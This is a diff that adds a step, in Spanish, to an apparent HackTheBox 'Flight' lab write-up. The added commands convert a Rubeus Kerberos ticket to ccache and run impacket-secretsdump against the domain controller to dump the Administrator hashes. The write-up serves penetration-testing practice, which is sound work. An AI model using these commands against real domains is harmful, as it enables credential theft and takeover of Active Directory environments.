@@ -254,6 +254,21 @@ enumerando este usuario podemos ver que cuenta con el permiso de `SeImpersonateP
 
 `Rubeus`
 Ahora que tenemos un ticket válido para la cuenta de la máquina, necesitamos convertirlo del formato base64 - kirbi a ccache para usarlo con impacket.
+
+```python
+cat ticket.b64 | base64 -d > ticket.kirbi
+
+kirbi2ccache ticket.kirbi ticket.ccache
+
+sudo ntpdate -u flight.htb
+
+KRB5CCNAME=ticket.ccache 
+
+impacket-secretsdump -k -no-pass g0.flight.htb -just-dc-user
+
+Administrator -target-ip 10.129.42.88
+```
+
 ![[Pasted image 20240810194913.png]]
 
 
